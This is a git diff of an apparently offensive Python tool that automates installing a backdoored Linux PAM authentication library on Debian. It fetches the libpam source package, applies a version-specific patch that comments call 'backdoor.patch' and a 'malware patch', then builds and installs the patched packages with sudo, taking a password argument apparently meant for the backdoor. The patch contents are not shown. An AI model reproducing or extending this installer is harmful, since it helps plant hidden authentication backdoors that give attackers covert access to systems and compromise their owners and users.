@@ -52,76 +52,98 @@ def download_file(url, dest):
     print(f"[+] Downloading {url} -> {dest}")
     run_cmd(["wget", "-c", url])
 
-#attempts to download the correct type of file from the PAM GitHub page, which uses two formats .tar.gz and .tar.xz
-def try_download(version):
-    # tar.gz format
-    # pam_dir = f"linux-pam-{version}"
-    pam_file = f"Linux-PAM-{version}.tar.gz"
-    url = f"{PAM_BASE_URL}/{pam_file}"
-    try:
-        download_file(url, pam_file)
-        pam_dir = f"Linux-PAM-{version}"
-        return pam_dir, pam_file
-    except RuntimeError:
-        print("tar.gz no work :( ")
+def fetch_debian_pam_source():
+    run_cmd(["apt-get", "source", "libpam0g"])
+    # Find the extracted directory
+    for d in os.listdir("."):
+        if d.startswith("linux-pam-"):
+            return d
+    raise RuntimeError("Debian PAM source not found")
 
-    # tar.xz format
-    # pam_dir = f"linux-pam-Linux-PAM-{version}"
-    pam_file = f"Linux-PAM-{version}.tar.xz"
-    url = f"{PAM_BASE_URL}/{pam_file}"
-    try:
-        download_file(url, pam_file)
-        pam_dir = f"Linux-PAM-{version}"
-        return pam_dir, pam_file
-    except RuntimeError:
-        print("well thats not good uhhhh tar.xz no work gg")
+#attempts to download the correct type of file from the PAM GitHub page, which uses two formats .tar.gz and .tar.xz
+# def try_download(version):
+#     # tar.gz format
+#     # pam_dir = f"linux-pam-{version}"
+#     pam_file = f"Linux-PAM-{version}.tar.gz"
+#     url = f"{PAM_BASE_URL}/{pam_file}"
+#     try:
+#         download_file(url, pam_file)
+#         pam_dir = f"Linux-PAM-{version}"
+#         return pam_dir, pam_file
+#     except RuntimeError:
+#         print("tar.gz no work :( ")
+
+#     # tar.xz format
+#     # pam_dir = f"linux-pam-Linux-PAM-{version}"
+#     pam_file = f"Linux-PAM-{version}.tar.xz"
+#     url = f"{PAM_BASE_URL}/{pam_file}"
+#     try:
+#         download_file(url, pam_file)
+#         pam_dir = f"Linux-PAM-{version}"
+#         return pam_dir, pam_file
+#     except RuntimeError:
+#         print("well thats not good uhhhh tar.xz no work gg")
 
 # extracts/unpacks the source tree so that it can be changed in later steps
 def extract_tarball(pam_file):
     print(f"[+] Extracting {pam_file}")
     with tarfile.open(pam_file, "r:*") as tar:
         tar.extractall()
-# applies a patch that changes the PAM file, then configures, compiles, and installs the new changes to take effect
-def build_pam(pam_dir: str, patch_file: str):
-    script_dir = Path(__file__).parent
+
+def build_debian_pam(pam_dir):
+    run_cmd(["sudo", "apt-get", "build-dep", "-y", "libpam0g"])
+    run_cmd(["dpkg-buildpackage", "-b", "-uc", "-us"], cwd=pam_dir)
+
+def install_built_packages():
+    for f in os.listdir(".."):
+        if f.startswith("libpam") and f.endswith(".deb"):
+            run_cmd(["sudo", "dpkg", "-i", f], cwd="..")
+
+def apply_patch(pam_dir, patch_file):
     patch_path = Path(__file__).parent / patch_file
-    subprocess.run(
-    ["patch", "-p1", "-d", pam_dir],
-    input=patch_path.read_bytes(),
-)
+    run_cmd(["patch", "-p1", "-i", str(patch_path)], cwd=pam_dir)
 
-    pam_path = Path(pam_dir)
+# applies a patch that changes the PAM file, then configures, compiles, and installs the new changes to take effect
+# def build_pam(pam_dir: str, patch_file: str):
+#     script_dir = Path(__file__).parent
+#     patch_path = Path(__file__).parent / patch_file
+#     subprocess.run(
+#     ["patch", "-p1", "-d", pam_dir],
+#     input=patch_path.read_bytes(),
+# )
+
+#     pam_path = Path(pam_dir)
     
-    # if not pam_path.exists():
-    #     raise FileNotFoundError(f"{pam_dir} does not exist after extraction")
+#     # if not pam_path.exists():
+#     #     raise FileNotFoundError(f"{pam_dir} does not exist after extraction")
 
-    # If ./configure does not exist, run ./autogen.sh
-    # configure_path = pam_path / "configure"
-    # if not configure_path.exists():
-    #     print("[+] ./configure not found, running ./autogen.sh")
-    #     run_cmd(["./autogen.sh"], cwd=str(pam_path))
+#     # If ./configure does not exist, run ./autogen.sh
+#     # configure_path = pam_path / "configure"
+#     # if not configure_path.exists():
+#     #     print("[+] ./configure not found, running ./autogen.sh")
+#     #     run_cmd(["./autogen.sh"], cwd=str(pam_path))
 
-    # print("[+] Running ./configure")
-    # run_cmd(["./configure"], cwd=str(pam_path))
+#     # print("[+] Running ./configure")
+#     # run_cmd(["./configure"], cwd=str(pam_path))
 
-    # print("[+] Running make")
-    # run_cmd(["make"], cwd=str(pam_path))
+#     # print("[+] Running make")
+#     # run_cmd(["make"], cwd=str(pam_path))
 
-    # subprocess.run(
-    #     #["patch", "-p1", "-d", pam_dir], input=open("backdoor.patch", "rb").read(),
-    #     ["patch", "-p1", "-d", pam_dir], input=patch_path.read_bytes(),
-    # )
+#     # subprocess.run(
+#     #     #["patch", "-p1", "-d", pam_dir], input=open("backdoor.patch", "rb").read(),
+#     #     ["patch", "-p1", "-d", pam_dir], input=patch_path.read_bytes(),
+#     # )
     
-    print("[+] Setting up meson")
-    run_cmd(["meson", "setup", "build"], cwd=str(pam_path))
+#     print("[+] Setting up meson")
+#     run_cmd(["meson", "setup", "build"], cwd=str(pam_path))
     
-    print("[+] compilin")
-    run_cmd(["meson", "compile", "-C", "build"], cwd=str(pam_path))
+#     print("[+] compilin")
+#     run_cmd(["meson", "compile", "-C", "build"], cwd=str(pam_path))
 
-    print("[+] install")
-    run_cmd(["meson", "install", "-C", "build"], cwd=str(pam_path))
+#     print("[+] install")
+#     run_cmd(["meson", "install", "-C", "build"], cwd=str(pam_path))
 
-    print("[+] Build complete")
+#     print("[+] Build complete")
 
 def main():
     parser = argparse.ArgumentParser(add_help=False)
@@ -146,6 +168,7 @@ def main():
     else:
         print("[!] Could not detect system PAM version. Using user-supplied version. Good luck, you're prob breaking something.")
         version = args.version.strip()
+        
     if version in PATCHES:
         patch_file = PATCHES[version]
     else:
@@ -153,36 +176,50 @@ def main():
         return
         
     # version = args.version.strip()
-    password = args.password
+    # password = args.password
     # args, unknown = parser.parse_known_args()
 
-    print("Automatic PAM Workflow (testing, no backdoor yet :3)")
+    print("Automatic Debian PAM Workflow")
     print(f"PAM Version: {version}")
     print(f"Password: {password}")
     print("")
 
-    global PAM_BASE_URL
-    PAM_BASE_URL = f"https://github.com/linux-pam/linux-pam/releases/download/v{version}"
+    print("[+] Fetching Debian PAM source package...") 
+    pam_dir = fetch_debian_pam_source() 
+    print(f"[+] Debian PAM source extracted to: {pam_dir}") 
+    
+    print("[+] Applying patch...") 
+    apply_patch(pam_dir, patch_file) 
+    
+    print("[+] Building Debian PAM packages...") 
+    build_debian_pam(pam_dir) 
+    
+    print("[+] Installing built PAM packages...") 
+    install_built_packages() 
+    print("[+] Debian PAM build + install complete.")
 
-    try:
-        pam_dir, pam_file = try_download(version)
-    except RuntimeError as e:
-        print(f"[!] downlaod no worky: {e}")
-        return
+    # global PAM_BASE_URL
+    # PAM_BASE_URL = f"https://github.com/linux-pam/linux-pam/releases/download/v{version}"
 
-    print(f"[+] Downloaded: {pam_file}")
-    print(f"[+] Extract directory: {pam_dir}")
+    # try:
+    #     pam_dir, pam_file = try_download(version)
+    # except RuntimeError as e:
+    #     print(f"[!] downlaod no worky: {e}")
+    #     return
 
-    # Check for patch
-    result = subprocess.run(["which", "patch"])
-    if result.returncode != 0:
-        print("Error: patch command not found. Exiting")
-        raise SystemExit(1)
+    # print(f"[+] Downloaded: {pam_file}")
+    # print(f"[+] Extract directory: {pam_dir}")
 
-    # unpacks downloaded source archive
-    extract_tarball(pam_file)
-    # runs the build process on the extracted source (MAKE THE MALWARE PATCH HERE)
-    build_pam(pam_dir, patch_file)
+    # # Check for patch
+    # result = subprocess.run(["which", "patch"])
+    # if result.returncode != 0:
+    #     print("Error: patch command not found. Exiting")
+    #     raise SystemExit(1)
+
+    # # unpacks downloaded source archive
+    # extract_tarball(pam_file)
+    # # runs the build process on the extracted source (MAKE THE MALWARE PATCH HERE)
+    # build_pam(pam_dir, patch_file)
 
 if __name__ == "__main__":
     main()
